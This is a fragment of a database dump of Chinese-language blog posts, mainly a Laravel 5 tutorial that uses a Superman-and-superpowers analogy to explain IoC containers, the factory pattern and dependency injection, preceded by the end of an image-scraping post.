ml&#39;,\r\n&#39;http://pp.163.com/fsh2110/pp/16781041.html&#39;,\r\n&#39;http://pp.163.com/platu/pp/16651047.html&#39;\r\n]\r\n#pa.savPageImg(imgs)\r\n#爬第二种链接则用以下方法\r\npa.savUserPageImg(&#39;http://tmsoul.pp.163.com/&#39;)</code></pre><p>由于编辑器实在让我蛋疼，这里格式会有点问题Tab和空格乱了...</p><p>Ps.代码难免会有不规范不严谨的地方 = 。=</p><h2>上成果！</h2><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456456004354876.png@base@tag=imgScale&q=100&w=690\" title=\"1456456004354876.png\" alt=\"QQ截图20160226094516.png\"/></p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456456059497813.png@base@tag=imgScale&q=100&w=690\" title=\"1456456059497813.png\" alt=\"QQ截图20160226094611.png\"/></p><p><br/></p>',1456456306,'2016-10-14 08:46:02','0000-00-00 00:00:00',6,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/image_1456455874557643.jpg?imageView2/1/w/210/h/140'),(124,0,'laravel','一只特立独行的猪2号','学习Laravel5的Ioc容器设计模式','容器，字面上理解就是装东西的东西。常见的变量、对象属性等都可以算是容器。一个容器能够装什么，全部取决于你对该容器的定义。当然，有这样一种容器，它存放的不是文本、数值，而是对象、对象的描述（类、接口）或者是提供对象的回调。','Laravel5的Ioc容器',',laravel的容器是什么意思,什么是IoC容器,什么是依赖注入,laravel服务容器','Ioc容器','Laravel5',297,'<p><img style=\"border-radius:4px\" src=\"http://lzxya.kssws.ks-cdn.com/image_1458533791318310.jpg@base@tag=imgScale&q=100&w=690\" title=\"1458533791318310.jpg\" alt=\"2.JPG\"/></p><h2>IoC 容器， laravel 的核心</h2><p>Laravel 的核心就是一个&nbsp;IoC 容器，根据文档，称其为“服务容器”，顾名思义，该容器提供了整个框架中需要的一系列服务。作为初学者，很多人会在这一个概念上犯难，因此，我打算从一些基础的内容开始讲解，通过理解面向对象开发中依赖的产生和解决方法，来逐渐揭开“依赖注入”的面纱，逐渐理解这一神奇的设计理念。</p><h2>用另一种方法解释这种设计模式，超人和超能力，依赖的产生！</h2><p>面向对象编程，有以下几样东西无时不刻的接触：<span style=\"color: rgb(0, 176, 80);\">接口</span>、<span style=\"color: rgb(0, 176, 80);\">类</span>还有<span style=\"color: rgb(0, 176, 80);\">对象</span>。这其中，接口是类的原型，一个类必须要遵守其实现的接口；对象则是一个类实例化后的产物，我们称其为一个实例。当然这样说肯定不利于理解，我们就实际的写点中看不中用的代码辅助学习。</p><p>我们把一个“超人”作为一个类</p><pre><code class=\"language-css\">class&nbsp;Superman&nbsp;{}</code></pre><p>我们可以想象，一个超人诞生的时候肯定拥有至少一个超能力，这个超能力也可以抽象为一个对象，为这个对象定义一个描述他的类吧。一个超能力肯定有多种属性、（操作）方法，这个尽情的想象，但是目前我们先大致定义一个只有属性的“超能力”，至于能干啥，我们以后再丰富：</p><pre><code class=\"language-css\">class&nbsp;Power&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;/**\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;能力值\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$ability;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;/**\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;能力范围或距离\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$range;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($ability,&nbsp;$range)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;ability&nbsp;=&nbsp;$ability;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;range&nbsp;=&nbsp;$range;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>这时候我们回过头，修改一下之前的“超人”类，让一个“超人”创建的时候被赋予一个超能力：</p><pre><code class=\"language-css\">class&nbsp;Superman\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$power;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct()\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;power&nbsp;=&nbsp;new&nbsp;Power(999,&nbsp;100);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>这样的话，当我们创建一个“超人”实例的时候，同时也创建了一个“超能力”的实例，但是，我们看到了一点，“超人”和“超能力”之间不可避免的产生了一个依赖。</p><p><span style=\"line-height: 25.6px; color: rgb(0, 176, 80); background-color: rgb(255, 255, 255);\">所谓“依赖”，就是 “我若依赖你，我就不能离开你”。</span></p><p>在一个贯彻面向对象编程的项目中，这样的依赖随处可见。少量的依赖并不会有太过直观的影响，我们随着这个例子逐渐铺开，让大家慢慢意识到，当依赖达到一个量级时，是怎样一番噩梦般的体验。当然，我也会自然而然的讲述如何解决问题。</p><h3>一堆乱麻 —— 可怕的依赖</h3><p>之前的例子中，超能力类实例化后是一个具体的超能力，但是我们知道，超人的超能力是多元化的，每种超能力的方法、属性都有不小的差异，没法通过一种类描述完全。我们现在进行修改，我们假设超人可以有以下多种超能力</p><ul class=\" list-paddingleft-2\"><li><p>飞行，属性有：飞行速度、持续飞行时间</p></li><li><p>蛮力，属性有：力量值</p></li><li><p>能量弹，属性有：伤害值、射击距离、同时射击个数</p></li></ul><p>我们创建了如下类：</p><pre><code class=\"language-css\">class&nbsp;Flight\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$speed;\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$holdtime;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($speed,&nbsp;$holdtime)&nbsp;{}\r\n}\r\n&nbsp;\r\nclass&nbsp;Force\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$force;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($force)&nbsp;{}\r\n}\r\n&nbsp;\r\nclass&nbsp;Shot\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$atk;\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$range;\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$limit;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($atk,&nbsp;$range,&nbsp;$limit)&nbsp;{}\r\n}</code></pre><p>好了，这下我们的超人有点“忙”了。在超人初始化的时候，我们会根据需要来实例化其拥有的超能力吗，大致如下：</p><pre><code class=\"language-css\">class&nbsp;Superman\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$power;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct()\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;power&nbsp;=&nbsp;new&nbsp;Fight(9,&nbsp;100);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;$this-&gt;power&nbsp;=&nbsp;new&nbsp;Force(45);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;$this-&gt;power&nbsp;=&nbsp;new&nbsp;Shot(99,&nbsp;50,&nbsp;2);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;power&nbsp;=&nbsp;array(\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;Force(45),\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;Shot(99,&nbsp;50,&nbsp;2)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>我们需要自己手动的在构造函数内（或者其他方法里）实例化一系列需要的类，这样并不好。可以想象，假如需求变更（不同的怪物横行地球），需要更多的有针对性的&nbsp;新的&nbsp;超能力，或者需要&nbsp;变更&nbsp;超能力的方法，我们必须&nbsp;重新改造&nbsp;超人。换句话说就是，改变超能力的同时，我还得重新制造个超人。效率太低了！新超人还没创造完成世界早已被毁灭。</p><p>这时，灵机一动的人想到：为什么不可以这样呢？超人的能力可以被随时更换，只需要添加或者更新一个芯片或者其他装置啥的（想到钢铁侠没）。这样的话就不要整个重新来过了。</p><p>对，就是这样的。我们不应该手动在 “超人” 类中固化了他的 “超能力” 初始化的行为，而转由外部负责，由外部创造超能力模组、装置或者芯片等（我们后面统一称为 “模组”），植入超人体内的某一个接口，这个接口是一个既定的，只要这个 “模组” 满足这个接口的装置都可以被超人所利用，可以提升、增加超人的某一种能力。这种由外部负责其依赖需求的行为，我们可以称其为 “<span style=\"color: rgb(0, 176, 80);\">控制反转（IoC）</span>”。</p><h3>工厂模式，依赖转移！</h3><p>当然，实现控制反转的方法有几种。在这之前，不如我们先了解一些好玩的东西。</p><p>我们可以想到，组件、工具（或者超人的模组），是一种可被生产的玩意儿，生产的地方当然是 “工厂（Factory）”，于是有人就提出了这样一种模式：&nbsp;工厂模式。</p><p>工厂模式，顾名思义，就是一个类所依赖的外部事物的实例，都可以被一个或多个 “工厂” 创建的这样一种开发模式，就是 “<span style=\"color: rgb(0, 176, 80);\">工厂模式</span>”。</p><p>我们为了给超人制造超能力模组，我们创建了一个工厂，它可以制造各种各样的模组，且仅需要通过一个方法：</p><pre><code class=\"language-css\">class&nbsp;SuperModuleFactory\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;makeModule($moduleName,&nbsp;$options)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;($moduleName)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;Fight&#39;:&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Fight($options[0],&nbsp;$options[1]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;Force&#39;:&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Force($options[0]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;Shot&#39;:&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Shot($options[0],&nbsp;$options[1],&nbsp;$options[2]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>这时候，超人 创建之初就可以使用这个工厂！</p><pre><code class=\"language-css\">class&nbsp;Superman\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$power;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct()\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;初始化工厂\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$factory&nbsp;=&nbsp;new&nbsp;SuperModuleFactory;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;通过工厂提供的方法制造需要的模块\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;power&nbsp;=&nbsp;$factory-&gt;makeModule(&#39;Fight&#39;,&nbsp;[9,&nbsp;100]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;$this-&gt;power&nbsp;=&nbsp;$factory-&gt;makeModule(&#39;Force&#39;,&nbsp;[45]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;$this-&gt;power&nbsp;=&nbsp;$factory-&gt;makeModule(&#39;Shot&#39;,&nbsp;[99,&nbsp;50,&nbsp;2]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;power&nbsp;=&nbsp;array(\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$factory-&gt;makeModule(&#39;Force&#39;,&nbsp;[45]),\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$factory-&gt;makeModule(&#39;Shot&#39;,&nbsp;[99,&nbsp;50,&nbsp;2])\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>可以看得出，我们不再需要在超人初始化之初，去初始化许多第三方类，只需初始化一个工厂类，即可满足需求。但这样似乎和以前区别不大，只是没有那么多&nbsp;new&nbsp;关键字。其实我们稍微改造一下这个类，你就明白，工厂类的真正意义和价值了。</p><pre><code class=\"language-css\">class&nbsp;Superman\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$power;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct(array&nbsp;$modules)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;初始化工厂\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$factory&nbsp;=&nbsp;new&nbsp;SuperModuleFactory;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;通过工厂提供的方法制造需要的模块\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($modules&nbsp;as&nbsp;$moduleName&nbsp;=&gt;&nbsp;$moduleOptions)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;power[]&nbsp;=&nbsp;$factory-&gt;makeModule($moduleName,&nbsp;$moduleOptions);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\n//&nbsp;创建超人\r\n$superman&nbsp;=&nbsp;new&nbsp;Superman([\r\n&nbsp;&nbsp;&nbsp;&nbsp;&#39;Fight&#39;&nbsp;=&gt;&nbsp;[9,&nbsp;100],&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&#39;Shot&#39;&nbsp;=&gt;&nbsp;[99,&nbsp;50,&nbsp;2]\r\n&nbsp;&nbsp;&nbsp;&nbsp;]);</code></pre><p>现在修改的结果令人满意。现在，“超人” 的创建不再依赖任何一个 “超能力” 的类，我们如若修改了或者增加了新的超能力，只需要针对修改&nbsp;SuperModuleFactory&nbsp;即可。扩充超能力的同时不再需要重新编辑超人的类文件，使得我们变得很轻松。但是，这才刚刚开始。</p><h3>再进一步！IoC 容器的重要组成 —— 依赖注入！</h3><p>由 “超人” 对 “超能力” 的依赖变成 “超人” 对 “超能力模组工厂” 的依赖后，对付小怪兽们变得更加得心应手。但这也正如你所看到的，依赖并未解除，只是由原来对多个外部的依赖变成了对一个 “工厂” 的依赖。假如工厂出了点麻烦，问题变得就很棘手。</p><p>其实大多数情况下，工厂模式已经足够了。工厂模式的缺点就是：接口未知（即没有一个很好的契约模型，关于这个我马上会有解释）、产生对象类型单一。总之就是，还是不够灵活。虽然如此，工厂模式依旧十分优秀，并且适用于绝大多数情况。不过我们为了讲解后面的&nbsp;依赖注入&nbsp;，这里就先夸大一下工厂模式的缺陷咯。</p><p>我们知道，超人依赖的模组，我们要求有统一的接口，这样才能和超人身上的注入接口对接，最终起到提升超能力的效果。</p><p>事实上，我之前说谎了，不仅仅只有一堆小怪兽，还有更多的大怪兽。嘿嘿。额，这时候似乎工厂的生产能力显得有些不足 —— 由于工厂模式下，所有的模组都已经在工厂类中安排好了，如果有新的、高级的模组加入，我们必须修改工厂类（好比增加新的生产线）：</p><pre><code class=\"language-css\">class&nbsp;SuperModuleFactory\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;makeModule($moduleName,&nbsp;$options)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;($moduleName)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;Fight&#39;:&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Fight($options[0],&nbsp;$options[1]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;Force&#39;:&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Force($options[0]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;&#39;Shot&#39;:&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Shot($options[0],&nbsp;$options[1],&nbsp;$options[2]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;case&nbsp;&#39;more&#39;:&nbsp;.......\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;case&nbsp;&#39;and&nbsp;more&#39;:&nbsp;.......\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;case&nbsp;&#39;and&nbsp;more&#39;:&nbsp;.......\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;case&nbsp;&#39;oh&nbsp;no!&nbsp;its&nbsp;too&nbsp;many!&#39;:&nbsp;.......\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>看到没。。。噩梦般的感受！</p><p>其实灵感就差一步！你可能会想到更为灵活的办法！对，下一步就是我们今天的主要配角 —— <span style=\"color: rgb(0, 176, 80);\">DI （依赖注入）</span></p><p>由于对超能力模组的需求不断增大，我们需要集合整个世界的高智商人才，一起解决问题，不应该仅仅只有几个工厂垄断负责。不过高智商人才们都非常自负，认为自己的想法是对的，创造出的超能力模组没有统一的接口，自然而然无法被正常使用。这时我们需要提出一种契约，这样无论是谁创造出的模组，都符合这样的接口，自然就可被正常使用。</p><pre><code class=\"language-css\">interface&nbsp;SuperModuleInterface\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;/**\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;超能力激活方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;任何一个超能力都得有该方法，并拥有一个参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*@param&nbsp;array&nbsp;$target&nbsp;针对目标，可以是一个或多个，自己或他人\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;activate(array&nbsp;$target);\r\n}</code></pre><blockquote style=\"box-sizing: border-box; margin: 1.6rem 0px; padding-top: 5px; padding-bottom: 5px; padding-left: 15px; border-left-width: 4px; border-left-style: solid; border-left-color: rgb(136, 136, 136);line-height: 25.6px; white-space: normal;\"><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0.4rem;\">上文中，我们定下了一个接口 （超能力模组的规范、契约），所有被创造的模组必须遵守该规范，才能被生产。</p></blockquote><p>其实，这就是 php 中&nbsp;接口（ interface ）&nbsp;的用处和意义！很多人觉得，为什么 php 需要接口这种东西？难道不是 java 、 C# 之类的语言才有的吗？这么说，只要是一个正常的面向对象编程语言（虽然 php 可以面向过程），都应该具备这一特性。因为一个对象（object）&nbsp;本身是由他的模板或者原型 ——&nbsp;类 （class）&nbsp;，经过实例化后产生的一个具体事物，而有时候，实现统一种方法且不同功能（或特性）的时候，会存在很多的类（class），这时候就需要有一个契约，让大家编写出可以被随时替换却不会产生影响的接口。这种由编程语言本身提出的硬性规范，会增加更多优秀的特性。</p><p>虽然有些绕，但通过我们接下来的实例，大家会慢慢领会接口带来的好处。</p><p>这时候，那些提出更好的超能力模组的高智商人才，遵循这个接口，创建了下述（模组）类：</p><pre><code class=\"language-css\">/**\r\n&nbsp;*&nbsp;X-超能量\r\n&nbsp;*/\r\nclass&nbsp;XPower&nbsp;implements&nbsp;SuperModuleInterface\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;activate(array&nbsp;$target)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这只是个例子。。具体自行脑补\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n\r\n/**\r\n&nbsp;*&nbsp;终极炸弹&nbsp;（就这么俗）\r\n&nbsp;*/\r\nclass&nbsp;UltraBomb&nbsp;implements&nbsp;SuperModuleInterface\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;activate(array&nbsp;$target)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这只是个例子。。具体自行脑补\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>同时，为了防止有些 “砖家” 自作聪明，或者一些叛徒恶意捣蛋，不遵守契约胡乱制造模组，影响超人，我们对超人初始化的方法进行改造：</p><p>改造完毕！现在，当我们初始化 “超人” 类的时候，提供的模组实例必须是一个<span style=\"color: rgb(0, 176, 80);\">SuperModuleInterface&nbsp;</span>接口的实现。否则就会提示错误。</p><p>正是由于超人的创造变得容易，一个超人也就不需要太多的超能力，我们可以创造多个超人，并分别注入需要的超能力模组即可。这样的话，虽然一个超人只有一个超能力，但超人更容易变多，我们也不怕怪兽啦！</p><blockquote style=\"box-sizing: border-box; margin: 1.6rem 0px; padding-top: 5px; padding-bottom: 5px; padding-left: 15px; border-left-width: 4px; border-left-style: solid; border-left-color: rgb(136, 136, 136);line-height: 25.6px; white-space: normal;\"><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0.4rem;\">现在有人疑惑了，你要讲的依赖注入呢？其实，上面讲的内容，正是依赖注入。</p></blockquote><p>什么叫做&nbsp;<span style=\"color: rgb(0, 176, 80);\">依赖注入</span>？</p><p>本文从开头到现在提到的一系列依赖，只要不是由内部生产（比如初始化、构造函数__construct&nbsp;中通过工厂方法、自行手动 new 的），而是由外部以参数或其他形式注入的，都属于&nbsp;依赖注入（DI）&nbsp;。是不是豁然开朗？事实上，就是这么简单。下面就是一个典型的依赖注入：</p><pre><code class=\"language-css\">//&nbsp;超能力模组\r\n$superModule&nbsp;=&nbsp;new&nbsp;XPower;\r\n&nbsp;\r\n//&nbsp;初始化一个超人，并注入一个超能力模组依赖\r\n$superMan&nbsp;=&nbsp;new&nbsp;Superman($superModule);</code></pre><p>关于依赖注入这个本文的主要配角，也就这么多需要讲的。理解了依赖注入，我们就可以继续深入问题。慢慢走近今天的主角……</p><h3>更为先进的工厂 —— IoC 容器！</h3><blockquote style=\"box-sizing: border-box; margin: 1.6rem 0px; padding-top: 5px; padding-bottom: 5px; padding-left: 15px; border-left-width: 4px; border-left-style: solid; border-left-color: rgb(136, 136, 136);line-height: 25.6px; white-space: normal;\"><p style=\"box-sizing: border-box; margin-top: 0px;\">现代社会，应该是高效率的生产，干净的车间，完美的自动化装配。</p></blockquote><p>一群怪兽来了，如此低效率产出超人是不现实，我们需要自动化 —— 最多一条指令，千军万马来相见。我们需要一种高级的生产车间，我们只需要向生产车间提交一个脚本，工厂便能够通过指令自动化生产。这种更为高级的工厂，就是工厂模式的升华 ——&nbsp;<span style=\"color: rgb(0, 176, 80);\">IoC 容器</span>。</p><pre><code class=\"language-css\">class&nbsp;Container\r\n{\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$binds;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$instances;\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;bind($abstract,&nbsp;$concrete)\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($concrete&nbsp;instanceof&nbsp;Closure)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;binds[$abstract]&nbsp;=&nbsp;$concrete;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;instances[$abstract]&nbsp;=&nbsp;$concrete;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;make($abstract,&nbsp;$parameters&nbsp;=&nbsp;[])\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(isset($this-&gt;instances[$abstract]))&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;instances[$abstract];\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array_unshift($parameters,&nbsp;$this);\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;call_user_func_array($this-&gt;binds[$abstract],&nbsp;$parameters);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>这时候，一个十分粗糙的容器就诞生了。现在的确很简陋，但不妨碍我们进一步提升他。先着眼现在，看看这个容器如何使用吧！</p><pre><code 